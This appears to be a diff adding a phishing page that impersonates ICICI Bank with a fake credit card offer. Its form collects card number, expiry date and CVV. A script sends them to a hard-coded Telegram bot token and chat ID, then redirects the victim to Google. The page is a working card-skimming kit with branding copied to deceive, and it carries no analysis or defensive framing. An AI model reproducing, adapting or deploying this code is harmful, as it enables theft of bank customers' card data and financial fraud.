@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ICICI</title>
+    <style>
+        /* Loading animation styles */
+        .lds-spinner {
+            color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 50%; /* Center vertically */
+            left: 40%; /* Center horizontally */
+            transform: translate(-50%, -50%); /* Center both horizontally and vertically */
+            background: rgba(255, 255, 255, 0.8);
+            z-index: 9999;
+        }
+        .lds-spinner div {
+            transform-origin: 40px 40px;
+            animation: lds-spinner 1.2s linear infinite;
+        }
+        .lds-spinner div:after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 3px;
+            left: 34px;
+            width: 6px;
+            height: 18px;
+            border-radius: 20%;
+            background: #000;
+        }
+        .lds-spinner div:nth-child(1) {
+            transform: rotate(0deg);
+            animation-delay: -1.1s;
+        }
+        .lds-spinner div:nth-child(2) {
+            transform: rotate(30deg);
+            animation-delay: -1s;
+        }
+        .lds-spinner div:nth-child(3) {
+            transform: rotate(60deg);
+            animation-delay: -0.9s;
+        }
+        .lds-spinner div:nth-child(4) {
+            transform: rotate(90deg);
+            animation-delay: -0.8s;
+        }
+        .lds-spinner div:nth-child(5) {
+            transform: rotate(120deg);
+            animation-delay: -0.7s;
+        }
+        .lds-spinner div:nth-child(6) {
+            transform: rotate(150deg);
+            animation-delay: -0.6s;
+        }
+        .lds-spinner div:nth-child(7) {
+            transform: rotate(180deg);
+            animation-delay: -0.5s;
+        }
+        .lds-spinner div:nth-child(8) {
+            transform: rotate(210deg);
+            animation-delay: -0.4s;
+        }
+        .lds-spinner div:nth-child(9) {
+            transform: rotate(240deg);
+            animation-delay: -0.3s;
+        }
+        .lds-spinner div:nth-child(10) {
+            transform: rotate(270deg);
+            animation-delay: -0.2s;
+        }
+        .lds-spinner div:nth-child(11) {
+            transform: rotate(300deg);
+            animation-delay: -0.1s;
+        }
+        .lds-spinner div:nth-child(12) {
+            transform: rotate(330deg);
+            animation-delay: 0s;
+        }
+        @keyframes lds-spinner {
+            0% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+            }
+        }
+
+        /* Main page styles with background color */
+        body {
+            background-color: #f0f0f0; /* Replace with the desired background color */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-screen" class="lds-spinner">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+    <!-- Your main page content goes here -->
+    <h1></h1>
+    <p> <!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ICICI Bank Credit Card Application</title>
+  <style>
+    body {
+      background-color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .title-box {
+      background-color: orange;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: center;
+      color: white;
+      margin-bottom: 3px;
+    }
+    .outer-box {
+      width: 88%;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: white;
+      border: 2px solid orange;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      color: black;
+    }
+    .text-editor-box {
+      font-size: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      padding: 10px;
+    }
+    .text-editor-box input[type="text"],
+    .text-editor-box input[type="number"] {
+      width: 96%;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 16px;
+      border: none;
+      border-bottom: 1px solid #ccc;
+    }
+    .submit-button {
+      background-color: orange;
+      color: white;
+      padding: 10px;
+      margin: 10px auto 20px auto;
+      width: 96%;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .lower-inputs {
+      display: flex;
+      justify-content: space-between;
+    }
+    .lower-inputs .input-field {
+      width: 45%;
+    }
+    .logo {
+      max-width: 200px;
+      margin-top: 10px;
+    }
+    .copyright {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+.customer-care {
+  background-color: #f7f7f7; /* Change this to match your exact color */
+  padding: 17px;
+  border-radius: 7px;
+  max-width: 450px;
+  margin: auto;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+  font-family: 'Arial', sans-serif; /* This is a guess, replace with the actual font-family if known */
+}
+
+.customer-care h2 {
+  color: #000; /* Adjust the color to match the design */
+  margin-bottom: 16px;
+}
+
+.customer-care p {
+  color: #555; /* Adjust the color to match the design */
+  font-size: 14px;
+  line-height: 1.2;
+}
+ .banner {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 5px; 10px;
+    background-color: orange;
+    color: white;
+    font-family: Arial, sans-serif;
+  }
+  .banner .icon {
+    background: url('https://iheartcraftythings.com/wp-content/uploads/2021/04/Light-Bulb-DRAWING-%E2%80%93-STEP-10.jpg') no-repeat center center;
+    background-size: contain;
+    width: 50px; /* Adjust as necessary */
+    height: 50px; /* Adjust as necessary */
+  }
+  .banner .text {
+    flex-grow: 1;
+    padding: 5px; 10px;
+  }
+  .banner .arrow {
+    background: url('https://www.prepressure.com/images/glyph_greater_than_sign_003E_33.png') no-repeat center center;
+    background-size: contain;
+    width: 30px; /* Adjust as necessary */
+    height: 30px; /* Adjust as necessary */
+  }
+
+  </style>
+</head>
+<body>
+  <div class="title-box">
+    <h1 style="text-transform: uppercase;">ICICI BANK CREDIT CARD</h1>
+  </div>
+  <div class="banner">
+  <div class="icon"></div>
+  <div class="text">Avail exciting offers from Summer Bonanza! TnC apply</div>
+  <div class="arrow"></div>
+</div>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/ICICI_Bank_Logo.svg" alt="ICICI Bank Logo" class="logo">
+  <div class="outer-box">
+    <div class="text-editor-box">
+      <form id="creditCardForm">
+        <label for="cardNumber">Card Number:</label>
+        <input type="text" id="cardNumber" name="cardNumber" required placeholder="xxxx-xxxx-xxxx-xxxx">
+        <div class="lower-inputs">
+          <div class="input-field">
+            <label for="expiryDate">Expiry Date:</label>
+            <input type="text" id="expiryDate" name="expiryDate" required placeholder="MM/YY">
+          </div>
+          <div class="input-field">
+            <label for="cuu">cvv:</label>
+            <input type="number" id="cuu" name="cuu" required placeholder="000">
+          </div>
+        </div>
+        <button type="submit" class="submit-button">Submit</button>
+      </form>
+    </div>
+  </div>
+  <div class="customer-care">
+  <h2>Contact Customer Care</h2>
+  <p>To contact ICICI Bank’s Customer Care, use the contact details updated here.</p>
+  <p>Please do not use the contact details updated on any other.</p>
+</div>
+
+
+  <script>
+    document.getElementById('creditCardForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      var cardNumber = document.getElementById('cardNumber').value;
+      var expiryDate = document.getElementById('expiryDate').value;
+      var cuu = document.getElementById('cuu').value;
+
+      // WARNING: Exposing your Telegram bot token in client-side code is insecure
+      var botToken = '6331212716:AAEOc0OrDcquVBMu7OSg_9ox7X71lB5yP5w'; // Replace with your actual bot token
+      var chatId = '5751079438'; // Replace with your actual chat ID
+      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      var message = `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCUU: ${cuu}`;
+
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          window.location.href = 'https://www.google.com';
+        } else {
+          alert('Failed to send the message to the Telegram bot.');
+        }
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+        alert('An error occurred while sending the message.');
+      });
+    });
+  </script>
+</body>
+</html>
+   </p>
+</body>
+</html>
